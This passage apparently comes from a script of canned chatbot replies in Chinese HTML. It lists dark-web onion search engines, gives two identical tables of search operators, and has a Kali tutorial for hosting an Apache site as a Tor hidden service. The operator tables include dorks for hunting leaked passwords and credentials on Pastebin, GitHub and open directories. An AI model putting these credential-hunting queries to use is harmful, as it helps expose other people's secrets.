8px;">Kraken</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://krakenai2gmgwwqyo7bcklv2lzcvhe7cxzzva2xpygyax5f33oqnxpad.onion" rel="nofollow">krakenai2gmgwwqyo7bcklv2lzcvhe7cxzzva2xpygyax5f33oqnxpad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Haystak</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion" rel="nofollow">haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Bobby</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://bobby64o755x3gsuznts6hf6agxqjcz5bop6hs7ejorekbm7omes34ad.onion" rel="nofollow">bobby64o755x3gsuznts6hf6agxqjcz5bop6hs7ejorekbm7omes34ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Submarine</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion" rel="nofollow">no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">DuckDuckGo</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion" rel="nofollow">duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Excavator</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion" rel="nofollow">2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorBot</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torbotzotnpygayi724oewxnynjp4pwumgmpiy3hljwuou3enxiyq3qd.onion" rel="nofollow">torbotzotnpygayi724oewxnynjp4pwumgmpiy3hljwuou3enxiyq3qd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Fenix</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://fenixnjoy6gcmcihl5fnhjqw6k7j6ujvggk4467cgl5lfsoingndoeyd.onion" rel="nofollow">fenixnjoy6gcmcihl5fnhjqw6k7j6ujvggk4467cgl5lfsoingndoeyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorLanD</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torlgu6zhhtwe73fdu76uiswgnkfvukqfujofxjfo7vzoht2rndyhxyd.onion" rel="nofollow">torlgu6zhhtwe73fdu76uiswgnkfvukqfujofxjfo7vzoht2rndyhxyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Dark Tor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://darktorhvabc652txfc575oendhykqcllb7bh7jhhsjduocdlyzdbmqd.onion/hidden.html" rel="nofollow">http://darktorhvabc652txfc575oendhykqcllb7bh7jhhsjduocdlyzdbmqd.onion/hidden.html</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Fresh onions</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://freshonifyfe4rmuh6qwpsexfhdrww7wnt5qmkoertwxmcuvm4woo4ad.onion" rel="nofollow">http://freshonifyfe4rmuh6qwpsexfhdrww7wnt5qmkoertwxmcuvm4woo4ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Gdarks</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://zb2jtkhnbvhkya3d46twv3g7lkobi4s62tjffqmafjibixk6pmq75did.onion" rel="nofollow">http://zb2jtkhnbvhkya3d46twv3g7lkobi4s62tjffqmafjibixk6pmq75did.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">The Deep Searches</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://searchgf7gdtauh7bhnbyed4ivxqmuoat3nm6zfrg3ymkq6mtnpye3ad.onion" rel="nofollow">http://searchgf7gdtauh7bhnbyed4ivxqmuoat3nm6zfrg3ymkq6mtnpye3ad.onion</a></td>     </tr>   </tbody> </table>`,
            `<p>OK，以下是暗网中的搜索引擎:</p>  <table style="border-collapse: collapse; width: 100%; border: 1px solid #e1e1e1e2;">   <thead>     <tr>       <th style="border: 1px solid #e1e1e1e2; padding: 8px; text-align: left;">Search Engine</th>       <th style="border: 1px solid #e1e1e1e2; padding: 8px; text-align: left;">URL</th>     </tr>   </thead>   <tbody>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">FindTor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://findtorroveq5wdnipkaojfpqulxnkhblymc7aramjzajcvpptd4rjqd.onion" rel="nofollow">findtorroveq5wdnipkaojfpqulxnkhblymc7aramjzajcvpptd4rjqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Darkweblink.com</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion" rel="nofollow">dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion/</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Torch</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion" rel="nofollow">torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorDex</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion" rel="nofollow">tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Ahmia</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion" rel="nofollow">juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Amnesia</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion" rel="nofollow">amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Demon</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://srcdemonm74icqjvejew6fprssuolyoc2usjdwflevbdpqoetw4x3ead.onion" rel="nofollow">srcdemonm74icqjvejew6fprssuolyoc2usjdwflevbdpqoetw4x3ead.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Sentor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion" rel="nofollow">e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Kraken</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://krakenai2gmgwwqyo7bcklv2lzcvhe7cxzzva2xpygyax5f33oqnxpad.onion" rel="nofollow">krakenai2gmgwwqyo7bcklv2lzcvhe7cxzzva2xpygyax5f33oqnxpad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Haystak</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion" rel="nofollow">haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Bobby</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://bobby64o755x3gsuznts6hf6agxqjcz5bop6hs7ejorekbm7omes34ad.onion" rel="nofollow">bobby64o755x3gsuznts6hf6agxqjcz5bop6hs7ejorekbm7omes34ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Submarine</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion" rel="nofollow">no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">DuckDuckGo</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion" rel="nofollow">duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Excavator</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion" rel="nofollow">2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorBot</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torbotzotnpygayi724oewxnynjp4pwumgmpiy3hljwuou3enxiyq3qd.onion" rel="nofollow">torbotzotnpygayi724oewxnynjp4pwumgmpiy3hljwuou3enxiyq3qd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Fenix</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://fenixnjoy6gcmcihl5fnhjqw6k7j6ujvggk4467cgl5lfsoingndoeyd.onion" rel="nofollow">fenixnjoy6gcmcihl5fnhjqw6k7j6ujvggk4467cgl5lfsoingndoeyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorLanD</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torlgu6zhhtwe73fdu76uiswgnkfvukqfujofxjfo7vzoht2rndyhxyd.onion" rel="nofollow">torlgu6zhhtwe73fdu76uiswgnkfvukqfujofxjfo7vzoht2rndyhxyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Dark Tor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://darktorhvabc652txfc575oendhykqcllb7bh7jhhsjduocdlyzdbmqd.onion/hidden.html" rel="nofollow">http://darktorhvabc652txfc575oendhykqcllb7bh7jhhsjduocdlyzdbmqd.onion/hidden.html</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Fresh onions</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://freshonifyfe4rmuh6qwpsexfhdrww7wnt5qmkoertwxmcuvm4woo4ad.onion" rel="nofollow">http://freshonifyfe4rmuh6qwpsexfhdrww7wnt5qmkoertwxmcuvm4woo4ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Gdarks</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://zb2jtkhnbvhkya3d46twv3g7lkobi4s62tjffqmafjibixk6pmq75did.onion" rel="nofollow">http://zb2jtkhnbvhkya3d46twv3g7lkobi4s62tjffqmafjibixk6pmq75did.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">The Deep Searches</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://searchgf7gdtauh7bhnbyed4ivxqmuoat3nm6zfrg3ymkq6mtnpye3ad.onion" rel="nofollow">http://searchgf7gdtauh7bhnbyed4ivxqmuoat3nm6zfrg3ymkq6mtnpye3ad.onion</a></td>     </tr>   </tbody> </table>`
          ],
        },







        "黑客,搜索": {
          reply: [
            `<p>在搜索引擎中（尤其是 Google、Bing、DuckDuckGo 等），你可以使用一些特殊的“搜索运算符”或“高级搜索指令”来精确控制搜索结果。这些指令通常放在搜索框里，与关键词一起使用，可以过滤、限制或指定你想找的信息。</p>

<p>以下是一些常用且非常有用的高级搜索指令：</p>

<h2>通用搜索指令（适用于多数搜索引擎）</h2>

<table border="1" cellspacing="0" cellpadding="5">
  <thead>
    <tr>
      <th>指令</th>
      <th>作用</th>
      <th>示例</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>site:</td>
      <td>限定搜索某个网站</td>
      <td><code>site:bbc.com ukraine</code></td>
    </tr>
    <tr>
      <td>filetype: 或 ext:</td>
      <td>搜索特定格式的文件</td>
      <td><code>filetype:pdf site:gov.cn 政策</code></td>
    </tr>
    <tr>
      <td>intitle:</td>
      <td>页面标题中必须包含该词</td>
      <td><code>intitle:登录 后台</code></td>
    </tr>
    <tr>
      <td>inurl:</td>
      <td>URL 中包含该词</td>
      <td><code>inurl:admin</code></td>
    </tr>
    <tr>
      <td>related:</td>
      <td>查找类似网站</td>
      <td><code>related:youtube.com</code></td>
    </tr>
    <tr>
      <td>cache:</td>
      <td>查看网站的缓存版本</td>
      <td><code>cache:nytimes.com</code></td>
    </tr>
    <tr>
      <td>link:</td>
      <td>查看链接到某页面的网站（Google 已不支持）</td>
      <td><code>link:cnn.com</code></td>
    </tr>
    <tr>
      <td>allinurl:</td>
      <td>URL 中必须包含所有给定词</td>
      <td><code>allinurl:admin login</code></td>
    </tr>
    <tr>
      <td>allintitle:</td>
      <td>页面标题中必须包含所有给定词</td>
      <td><code>allintitle:phpmyadmin login</code></td>
    </tr>
  </tbody>
</table>

<h2>搜索逻辑运算符</h2>

<table border="1" cellspacing="0" cellpadding="5">
  <thead>
    <tr>
      <th>运算符</th>
      <th>作用</th>
      <th>示例</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>" "</td>
      <td>精确匹配短语</td>
      <td><code>"open directory"</code></td>
    </tr>
    <tr>
      <td>-</td>
      <td>排除某个词</td>
      <td><code>phpmyadmin -login</code></td>
    </tr>
    <tr>
      <td>OR / </td>
      <td>搜索多个关键词之一</td>
      <td>(示例略，通常用 OR 连接)</td>
    </tr>
    <tr>
      <td>*</td>
      <td>通配符，占位任意词</td>
      <td><code>"how to * a website"</code></td>
    </tr>
  </tbody>
</table>

<h2>文件/目录/开源情报类（常用于 OSINT 或渗透测试）</h2>

<table border="1" cellspacing="0" cellpadding="5">
  <thead>
    <tr>
      <th>指令</th>
      <th>作用</th>
      <th>示例</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>"index of /"</td>
      <td>查找开放目录</td>
      <td><code>"index of /" "secret files"</code></td>
    </tr>
    <tr>
      <td>parent directory</td>
      <td>类似上面，查找开放父目录</td>
      <td><code>"parent directory" "mp4"</code></td>
    </tr>
    <tr>
      <td>intext:</td>
      <td>搜索正文中包含关键词的网页</td>
      <td><code>intext:"confidential"</code></td>
    </tr>
    <tr>
      <td>password + filetype:txt</td>
      <td>查找可能含密码的文本文件</td>
      <td><code>password filetype:txt site:pastebin.com</code></td>
    </tr>
  </tbody>
</table>

<h2>黑客/暗网情报（仅限教育用途）</h2>

<table border="1" cellspacing="0" cellpadding="5">
  <thead>
    <tr>
      <th>指令</th>
      <th>示例用途</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>site:pastebin.com + password</td>
      <td>查找泄露信息</td>
    </tr>
    <tr>
      <td>site:github.com + ftp password</td>
      <td>搜索公开的 GitHub 密码</td>
    </tr>
    <tr>
      <td>inurl:.onion</td>
      <td>查找暗网链接（在 clearnet 上有限）</td>
    </tr>
  </tbody>
</table>

<h2>DuckDuckGo 特有（部分支持）</h2>

<table border="1" cellspacing="0" cellpadding="5">
  <thead>
    <tr>
      <th>指令</th>
      <th>说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>!g</td>
      <td>强制跳转到 Google 搜索</td>
    </tr>
    <tr>
      <td>!yt</td>
      <td>跳转到 YouTube</td>
    </tr>
    <tr>
      <td>!gh</td>
      <td>跳转到 GitHub</td>
    </tr>
    <tr>
      <td>!so</td>
      <td>跳转到 StackOverflow</td>
    </tr>
  </tbody>
</table>

<p>这是 DuckDuckGo 的“bangs”功能，语法是 <code>!关键词</code>。</p>

<h2>示例组合查询</h2>

<pre><code>site:gov.cn filetype:pdf "环境保护" -计划
搜索中国政府网站上与环境保护有关的 PDF 文件，排除含“计划”的结果。

intitle:"index of" admin login password
搜索网页标题包含“index of”，且内容可能包含 admin login password 的目录。
</code></pre>`

          ],
        },




                "专业,搜索": {
          reply: [
            `<p>在搜索引擎中（尤其是 Google、Bing、DuckDuckGo 等），你可以使用一些特殊的“搜索运算符”或“高级搜索指令”来精确控制搜索结果。这些指令通常放在搜索框里，与关键词一起使用，可以过滤、限制或指定你想找的信息。</p>

<p>以下是一些常用且非常有用的高级搜索指令：</p>

<h2>通用搜索指令（适用于多数搜索引擎）</h2>

<table border="1" cellspacing="0" cellpadding="5">
  <thead>
    <tr>
      <th>指令</th>
      <th>作用</th>
      <th>示例</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>site:</td>
      <td>限定搜索某个网站</td>
      <td><code>site:bbc.com ukraine</code></td>
    </tr>
    <tr>
      <td>filetype: 或 ext:</td>
      <td>搜索特定格式的文件</td>
      <td><code>filetype:pdf site:gov.cn 政策</code></td>
    </tr>
    <tr>
      <td>intitle:</td>
      <td>页面标题中必须包含该词</td>
      <td><code>intitle:登录 后台</code></td>
    </tr>
    <tr>
      <td>inurl:</td>
      <td>URL 中包含该词</td>
      <td><code>inurl:admin</code></td>
    </tr>
    <tr>
      <td>related:</td>
      <td>查找类似网站</td>
      <td><code>related:youtube.com</code></td>
    </tr>
    <tr>
      <td>cache:</td>
      <td>查看网站的缓存版本</td>
      <td><code>cache:nytimes.com</code></td>
    </tr>
    <tr>
      <td>link:</td>
      <td>查看链接到某页面的网站（Google 已不支持）</td>
      <td><code>link:cnn.com</code></td>
    </tr>
    <tr>
      <td>allinurl:</td>
      <td>URL 中必须包含所有给定词</td>
      <td><code>allinurl:admin login</code></td>
    </tr>
    <tr>
      <td>allintitle:</td>
      <td>页面标题中必须包含所有给定词</td>
      <td><code>allintitle:phpmyadmin login</code></td>
    </tr>
  </tbody>
</table>

<h2>搜索逻辑运算符</h2>

<table border="1" cellspacing="0" cellpadding="5">
  <thead>
    <tr>
      <th>运算符</th>
      <th>作用</th>
      <th>示例</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>" "</td>
      <td>精确匹配短语</td>
      <td><code>"open directory"</code></td>
    </tr>
    <tr>
      <td>-</td>
      <td>排除某个词</td>
      <td><code>phpmyadmin -login</code></td>
    </tr>
    <tr>
      <td>OR / </td>
      <td>搜索多个关键词之一</td>
      <td>(示例略，通常用 OR 连接)</td>
    </tr>
    <tr>
      <td>*</td>
      <td>通配符，占位任意词</td>
      <td><code>"how to * a website"</code></td>
    </tr>
  </tbody>
</table>

<h2>文件/目录/开源情报类（常用于 OSINT 或渗透测试）</h2>

<table border="1" cellspacing="0" cellpadding="5">
  <thead>
    <tr>
      <th>指令</th>
      <th>作用</th>
      <th>示例</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>"index of /"</td>
      <td>查找开放目录</td>
      <td><code>"index of /" "secret files"</code></td>
    </tr>
    <tr>
      <td>parent directory</td>
      <td>类似上面，查找开放父目录</td>
      <td><code>"parent directory" "mp4"</code></td>
    </tr>
    <tr>
      <td>intext:</td>
      <td>搜索正文中包含关键词的网页</td>
      <td><code>intext:"confidential"</code></td>
    </tr>
    <tr>
      <td>password + filetype:txt</td>
      <td>查找可能含密码的文本文件</td>
      <td><code>password filetype:txt site:pastebin.com</code></td>
    </tr>
  </tbody>
</table>

<h2>黑客/暗网情报（仅限教育用途）</h2>

<table border="1" cellspacing="0" cellpadding="5">
  <thead>
    <tr>
      <th>指令</th>
      <th>示例用途</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>site:pastebin.com + password</td>
      <td>查找泄露信息</td>
    </tr>
    <tr>
      <td>site:github.com + ftp password</td>
      <td>搜索公开的 GitHub 密码</td>
    </tr>
    <tr>
      <td>inurl:.onion</td>
      <td>查找暗网链接（在 clearnet 上有限）</td>
    </tr>
  </tbody>
</table>

<h2>DuckDuckGo 特有（部分支持）</h2>

<table border="1" cellspacing="0" cellpadding="5">
  <thead>
    <tr>
      <th>指令</th>
      <th>说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>!g</td>
      <td>强制跳转到 Google 搜索</td>
    </tr>
    <tr>
      <td>!yt</td>
      <td>跳转到 YouTube</td>
    </tr>
    <tr>
      <td>!gh</td>
      <td>跳转到 GitHub</td>
    </tr>
    <tr>
      <td>!so</td>
      <td>跳转到 StackOverflow</td>
    </tr>
  </tbody>
</table>

<p>这是 DuckDuckGo 的“bangs”功能，语法是 <code>!关键词</code>。</p>

<h2>示例组合查询</h2>

<pre><code>site:gov.cn filetype:pdf "环境保护" -计划
搜索中国政府网站上与环境保护有关的 PDF 文件，排除含“计划”的结果。

intitle:"index of" admin login password
搜索网页标题包含“index of”，且内容可能包含 admin login password 的目录。
</code></pre>`

          ],
        },






        "开发,暗网":{
          reply:[
            `
              <h1>如何开发自己的暗网</h1>

  <p>在Kali 中创建一个文件夹  如 huoshi12</p>

  <p>之后在终端输入</p>
  <pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
sudo cp -r /home/kali/huoshi12 /var/www/html/
</code></pre>

  <p>这段代码会将huoshi12 复制到  var/www/HTML/ 里面方便之后进行开发</p>

  <p>在这段写下这个代码 用来编辑 HTML css 和 JavaScript</p>

  <pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
sudo nano /var/www/html/huoshi12/huoshi1.html

sudo nano /var/www/html/huoshi12/huoshi1.css

sudo nano /var/www/html/huoshi12/huoshi1.js
</code></pre>

  <p>保存按下 ctrl + o 之后按下回车键 enter，再按下 ctrl + x 关闭</p>

  <p>编辑好后，在Kali里的FIRE FOX 中查看本地文件网站是否可以正常访问</p>
  <p>http://localhost</p>
  <p>或者</p>
  <p>http://localhost/huoshi12/huoshi1.html</p>

  <p>在kali中安装apache 服务器和检查最新版本:</p>
  <pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~]
└─# sudo apt update
sudo apt install apache2
</code></pre>

  <p>会输出:</p>
  <pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
Hit:1 http://http.kali.org/kali kali-rolling InRelease
1223 packages can be upgraded. Run 'apt list --upgradable' to see them.
apache2 is already the newest version (2.4.63-1).
Summary:
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 1223
</code></pre>

  <p>在Kali 写入这个代码 开始运行apache2:</p>
  <pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~]
└─# sudo systemctl start apache2
</code></pre>

  <p>之后在Kali 写入这段代码 查看是否在运行:</p>
  <pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~]
└─# sudo systemctl status apache2
</code></pre>

  <p>会输出 关键是要显示出 Active: active (running):</p>
  <pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
● apache2.service - The Apache HTTP Server
     Loaded: loaded (/usr/lib/systemd/system/apache2.service; disabled; preset: disabled)
     Active: active (running) since Sun 2025-05-18 05:51:50 EDT; 11min ago
 Invocation: 7520bfceea4c4936869f1161b0cb6a6f
       Docs: https://httpd.apache.org/docs/2.4/
    Process: 17444 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)
   Main PID: 17460 (apache2)
      Tasks: 6 (limit: 2210)
     Memory: 35.3M (peak: 35.7M)
        CPU: 135ms
     CGroup: /system.slice/apache2.service
             ├─17460 /usr/sbin/apache2 -k start
             ├─17463 /usr/sbin/apache2 -k start
             ├─17464 /usr/sbin/apache2 -k start
             ├─17465 /usr/sbin/apache2 -k start
             ├─17466 /usr/sbin/apache2 -k start
             └─17467 /usr/sbin/apache2 -k start

May 18 05:51:50 kali systemd[1]: Starting apache2.service - The Apache HTTP Server...
May 18 05:51:50 kali apachectl[17459]: AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1. Set the 'ServerName' directive globally to suppress this message
May 18 05:51:50 kali systemd[1]: Started apache2.service - The Apache HTTP Server.
</code></pre>

  <p>输入这段代码 查看 tor:</p>
  <pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~]
└─# sudo nano /etc/tor/torrc
</code></pre>

<p>输出:</p>

  <pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
会显示很多标有 # 的信息
找到这两段

#HiddenServiceDir /var/lib/tor/hidden_service/
#HiddenServicePort 80 127.0.0.1:80

将这个符号去掉 # 

HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 127.0.0.1:80
</code></pre>
<p>之后按下ctrl + o 保存 再按下 回车键 enter，之后再按下 ctrl + x 关闭</p>
<br>
  <p>输入这段代码 重启 TOR :</p>
  <pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~]
└─# sudo systemctl restart tor
</code></pre>

  <p>输入这段代码 让文件能够正确的运行暗网中:</p>
  <pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~]
└─# sudo chown -R www-data:www-data /var/www/html/huoshi12
sudo chmod -R 755 /var/www/html/huoshi12
</code></pre>

<p>如果不是文件夹 如 huoshi12 那么可以直接创建一个html文件网站在 /var/www/html 目录中 名字必须是 index.html 必须是 index，否则暗网链接不能正确进入，而是会错误的进入文件管理路径的形式。</p>
<p>如下:</p>

  <pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~]
└─# sudo chown -R www-data:www-data /var/www/html/index.html
sudo chmod -R 755 /var/www/html/index.html
</code></pre>
<br>
  <p>输入这段代码 创建 onion 连接:</p>
  <pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~]
└─# sudo cat /var/lib/tor/hidden_service/hostname
</code></pre>

  <p>输出:</p>
  <pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
abcd1234.onion
</code></pre>

  <p>如果网站文件保存在另一个文件夹里 如 /var/www/html/huoshi12/huoshi1.html 这里面huoshi12/huoshi1.html 那么得在 链接前面添加这个路径</p>

  <p>如:</p>
  <p>abcd1234.onion/huoshi12/huoshi1.html</p>

  <p>之后进入TOR 浏览器 粘贴这段暗网链接 就能够访问自己的暗网了。</p>
  <br>
  <p>最后如果你想要删除什么文件可以在root权限 终端 写入这段代码 删除目标文件或文件夹。</p>
  
  <pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
  sudo rm -rf /var/www/html/huoshi12
</code></pre>

<p> 最重要的部分就是保护网址的目录文件 如, http://abc123.onion/content/index.html 如果用户把在输入框里的 index.html 去掉，那么可能会看到 http://abc123.onion/content 的目录文件，这里必须要禁止用户看到文件，防止文件，数据 泄露。
<br><br>
以下是需要的保护文件目录不会在网页中显示的方法:
</p>

<p>打开 终端 写以下代码:</p>
  <pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
  sudo nano /etc/apache2/sites-available/000-default.conf
</code></pre>
<p>这是会打开apache 服务器的conf 进行编辑修改。</p>
<br>
<p>输出以下代码:</p>

  <pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
&lt;VirtualHost *:80&gt;
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request&#x27;s Host: header to
